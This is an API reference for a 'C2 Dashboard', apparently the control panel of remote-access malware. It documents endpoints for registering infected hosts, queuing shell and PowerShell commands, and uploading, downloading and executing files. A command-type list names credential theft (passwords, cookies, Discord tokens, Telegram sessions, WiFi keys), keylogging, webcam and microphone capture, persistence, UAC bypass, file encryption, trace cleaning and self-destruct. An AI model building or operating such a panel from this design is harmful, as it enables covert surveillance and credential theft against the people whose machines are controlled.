# C2 Dashboard - API Reference

## Base URL
```
http://localhost:3000/api
```

## Response Format
All endpoints return:
```json
{
  "success": true,
  "data": {...},
  "message": "Optional message"
}
```

Or on error:
```json
{
  "success": false,
  "error": "Error message"
}
```

---

## Clients API

### List All Clients
```http
GET /clients/list
```
**Response:**
```json
{
  "success": true,
  "data": {
    "clients": [...],
    "stats": {
      "totalClients": 5,
      "onlineClients": 3,
      "offlineClients": 2,
      "adminClients": 1
    },
    "total": 5
  }
}
```

### Register New Client
```http
POST /clients/register
Content-Type: application/json

{
  "hostname": "WORKSTATION-01",
  "username": "admin",
  "os": "Windows 11",
  "ip_address": "192.168.1.100",
  "architecture": "x64",
  "is_admin": true
}
```
**Response:**
```json
{
  "success": true,
  "data": {
    "client": {
      "id": "uuid",
      "hostname": "WORKSTATION-01",
      "username": "admin",
      "status": "online",
      "last_seen": "2024-03-22T10:00:00Z"
    }
  }
}
```

### Get Client Details
```http
GET /clients/{id}/info
```
**Response:**
```json
{
  "success": true,
  "data": {
    "client": {...},
    "commands": [...],
    "metrics": {...},
    "files": [...],
    "recentActivity": {...}
  }
}
```

### Delete Client
```http
DELETE /clients/{id}/delete
```
**Response:**
```json
{
  "success": true,
  "message": "Client deleted successfully"
}
```

---

## Commands API

### Queue New Command
```http
POST /commands/queue
Content-Type: application/json

{
  "client_id": "uuid",
  "command_type": "shell",
  "command_name": "whoami",
  "parameters": {
    "timeout": 5000
  }
}
```
**Response:**
```json
{
  "success": true,
  "data": {
    "command": {
      "id": "uuid",
      "client_id": "uuid",
      "command_type": "shell",
      "command_name": "whoami",
      "status": "pending",
      "created_at": "2024-03-22T10:00:00Z"
    }
  }
}
```

### List Commands
```http
GET /commands/list?client_id={id}&status={status}&limit=100
```
**Query Parameters:**
- `client_id` (optional) - Filter by client
- `status` (optional) - Filter by status (pending/executing/completed/failed)
- `limit` (optional) - Limit results (default: 100)

**Response:**
```json
{
  "success": true,
  "data": {
    "commands": [...],
    "stats": {
      "pending": 5,
      "executing": 2,
      "completed": 50,
      "failed": 1,
      "total": 58
    },
    "total": 20
  }
}
```

### Get Command Status
```http
GET /commands/{id}/status
```
**Response:**
```json
{
  "success": true,
  "data": {
    "command": {
      "id": "uuid",
      "status": "completed",
      "result": "WORKSTATION-01\\admin",
      "execution_time": "2024-03-22T10:00:05Z"
    }
  }
}
```

### Update Command Status
```http
POST /commands/{id}/status
Content-Type: application/json

{
  "status": "completed",
  "result": "command output",
  "error": null
}
```
**Status Values:** executing, completed, failed

**Response:**
```json
{
  "success": true,
  "message": "Command status updated to completed"
}
```

### Cancel Command
```http
DELETE /commands/{id}/cancel
```
**Response:**
```json
{
  "success": true,
  "message": "Command cancelled successfully"
}
```

---

## System Metrics API

### Record New Metrics
```http
POST /system/metrics/update
Content-Type: application/json

{
  "client_id": "uuid",
  "cpu_usage": 45.5,
  "memory_usage": 62.3,
  "memory_total": 16000,
  "disk_usage": 50.0,
  "disk_total": 500000,
  "network_interfaces": {
    "eth0": {"rx": 1024000, "tx": 2048000}
  },
  "running_processes": ["process1", "process2"],
  "network_connections": {"tcp": 45, "udp": 12}
}
```
**Response:**
```json
{
  "success": true,
  "data": {
    "metrics": {...}
  }
}
```

### Get All Latest Metrics
```http
GET /system/metrics
```
**Response:**
```json
{
  "success": true,
  "data": {
    "metrics": [
      {
        "client_id": "uuid",
        "cpu_usage": 45.5,
        "memory_usage": 62.3,
        "timestamp": "2024-03-22T10:00:00Z"
      }
    ],
    "total": 5,
    "timestamp": "2024-03-22T10:00:00Z"
  }
}
```

### Get Client Metrics
```http
GET /system/{id}/metrics?type=latest&hours=24
```
**Query Parameters:**
- `type` - latest, timeseries, or aggregate (default: latest)
- `hours` - Hours of historical data (default: 24)

**Response:**
```json
{
  "success": true,
  "data": {
    "metrics": {...},
    "type": "latest",
    "timestamp": "2024-03-22T10:00:00Z"
  }
}
```

---

## Files API

### Create File Operation
```http
POST /files/operations
Content-Type: application/json

{
  "client_id": "uuid",
  "command_id": "uuid",
  "file_path": "C:\\Users\\admin\\file.txt",
  "file_name": "file.txt",
  "file_size": 1024,
  "file_type": "txt",
  "operation": "download",
  "local_path": "/tmp/file.txt"
}
```
**Operation Values:** download, upload, delete, execute

**Response:**
```json
{
  "success": true,
  "data": {
    "file_operation": {
      "id": "uuid",
      "status": "pending"
    }
  }
}
```

### List File Operations
```http
GET /files/list?client_id={id}&operation={op}&status={status}&limit=100
```
**Query Parameters:**
- `client_id` (optional) - Filter by client
- `operation` (optional) - Filter by operation type
- `status` (optional) - Filter by status
- `limit` (optional) - Result limit (default: 100)

**Response:**
```json
{
  "success": true,
  "data": {
    "files": [...],
    "stats": {
      "totalOperations": 50,
      "completedOperations": 45,
      "failedOperations": 2,
      "pendingOperations": 3,
      "totalSize": 52428800
    },
    "total": 20
  }
}
```

### Get File Operation Status
```http
GET /files/{id}/status
```
**Response:**
```json
{
  "success": true,
  "data": {
    "file_operation": {
      "id": "uuid",
      "status": "completed",
      "file_size": 1024,
      "local_path": "/tmp/file.txt"
    }
  }
}
```

### Update File Operation Status
```http
POST /files/{id}/status
Content-Type: application/json

{
  "status": "completed",
  "local_path": "/tmp/file.txt",
  "file_size": 1024,
  "progress": 100
}
```
**Status Values:** in_progress, completed, failed

**Response:**
```json
{
  "success": true,
  "message": "File operation status updated to completed"
}
```

---

## Dashboard API

### Get Dashboard Overview
```http
GET /dashboard/overview
```
**Response:**
```json
{
  "success": true,
  "data": {
    "summary": {
      "clients": {
        "totalClients": 5,
        "onlineClients": 3,
        "adminClients": 1,
        "offlineClients": 2
      },
      "commands": {
        "pending": 2,
        "executing": 1,
        "completed": 50,
        "failed": 1,
        "total": 54
      },
      "files": {
        "totalOperations": 20,
        "completedOperations": 18,
        "failedOperations": 1,
        "pendingOperations": 1,
        "totalSize": 10485760
      },
      "sessions": {
        "activeSessions": 2,
        "totalSessions": 10,
        "inactiveSessions": 8
      }
    },
    "metrics": {
      "averageCpu": 38.5,
      "averageMemory": 52.3,
      "totalClients": 5
    },
    "recentActivity": {
      "pendingCommands": 2,
      "onlineClients": 3,
      "completedFiles": 18
    },
    "timestamp": "2024-03-22T10:00:00Z"
  }
}
```

### System Health Check
```http
GET /dashboard/health
```
**Response:**
```json
{
  "success": true,
  "status": "healthy",
  "data": {
    "database": {
      "connected": true,
      "tables": 7
    },
    "timestamp": "2024-03-22T10:00:00Z",
    "uptime": 3600
  }
}
```

---

## Test/Mock Client API

### Get Mock Client Info
```http
GET /test/mock-client
```
**Response:**
```json
{
  "success": true,
  "message": "Mock client simulator API",
  "endpoints": {
    "register": "POST with {action: 'register', count: 1}",
    "metrics": "POST with {action: 'metrics'}",
    "commands": "POST with {action: 'commands', count: 1}",
    "cleanup": "POST with {action: 'cleanup'}"
  }
}
```

### Register Mock Clients
```http
POST /test/mock-client
Content-Type: application/json

{
  "action": "register",
  "count": 5
}
```
**Response:**
```json
{
  "success": true,
  "message": "Registered 5 mock clients",
  "data": {
    "clients": [...]
  }
}
```

### Record Mock Metrics
```http
POST /test/mock-client
Content-Type: application/json

{
  "action": "metrics"
}
```
**Response:**
```json
{
  "success": true,
  "message": "Recorded metrics for 5 clients",
  "data": {
    "metrics": [...]
  }
}
```

### Queue Mock Commands
```http
POST /test/mock-client
Content-Type: application/json

{
  "action": "commands",
  "count": 3
}
```
**Response:**
```json
{
  "success": true,
  "message": "Queued 3 mock commands",
  "data": {
    "commands": [...]
  }
}
```

### Cleanup Mock Data
```http
POST /test/mock-client
Content-Type: application/json

{
  "action": "cleanup"
}
```
**Response:**
```json
{
  "success": true,
  "message": "Cleaned up 5 clients"
}
```

---

## Command Types

### Execution Commands
- `shell` - Execute shell command
- `powershell` - Execute PowerShell command
- `script` - Execute script file

### Surveillance Commands
- `screenshot` - Capture screen
- `webcam` - Webcam capture
- `audio_stream` - Audio streaming
- `microphone` - Microphone capture
- `keylog` - Keyboard logging
- `clipboard` - Clipboard monitoring
- `window_logger` - Window activity
- `webcam_stream` - Live webcam stream

### File Commands
- `download` - Download file
- `upload` - Upload file
- `browse` - Browse files
- `encrypt` - Encrypt file

### Credential Commands
- `passwords` - Extract passwords
- `cookies` - Extract cookies
- `wifi` - WiFi credentials
- `discord` - Discord tokens
- `telegram` - Telegram sessions

### System Commands
- `system_info` - Get system information
- `processes` - Get process list
- `registry` - Registry access
- `port_scanner` - Port scanning
- `av_detection` - AV detection
- `netstat` - Network statistics
- `arp_table` - ARP table

### Persistence Commands
- `enable_persistence` - Enable persistence
- `elevate` - Elevate privileges
- `rdp` - RDP access
- `uac_bypass` - UAC bypass

### Cleanup Commands
- `clean_traces` - Clean traces
- `self_destruct` - Self destruct
- `abort_tasks` - Abort tasks

---

## Error Codes

### 400 Bad Request
Missing required fields or invalid parameters

### 404 Not Found
Resource not found (client, command, etc.)

### 500 Internal Server Error
Server error - check logs

### 503 Service Unavailable
Database connection failed

---

## Rate Limiting
Currently no rate limiting. Consider adding for production.

## Authentication
Currently no authentication. Consider adding JWT for production.

## CORS
API routes are accessible from http://localhost:3000

---

## Testing with cURL

### Register Client
```bash
curl -X POST http://localhost:3000/api/clients/register \
  -H "Content-Type: application/json" \
  -d '{
    "hostname": "TEST-PC",
    "username": "test",
    "os": "Windows 11",
    "ip_address": "192.168.1.100"
  }'
```

### Queue Command
```bash
curl -X POST http://localhost:3000/api/commands/queue \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "YOUR_CLIENT_ID",
    "command_type": "shell",
    "command_name": "whoami"
  }'
```

### Update Metrics
```bash
curl -X POST http://localhost:3000/api/system/metrics/update \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "YOUR_CLIENT_ID",
    "cpu_usage": 45,
    "memory_usage": 60,
    "memory_total": 16000,
    "disk_usage": 50,
    "disk_total": 500000
  }'
```

---

## React Hook Examples

```typescript
import { useClients, useCommands, useMetrics } from '@/hooks/use-api'

// List clients
const { listClients } = useClients()
const response = await listClients()
console.log(response.data.clients)

// Queue command
const { queueCommand } = useCommands()
await queueCommand({
  client_id: 'uuid',
  command_type: 'shell',
  command_name: 'whoami'
})

// Get metrics
const { getMetrics } = useMetrics()
const metrics = await getMetrics('latest', 'client-uuid')
```

---

*Last Updated: March 22, 2024*
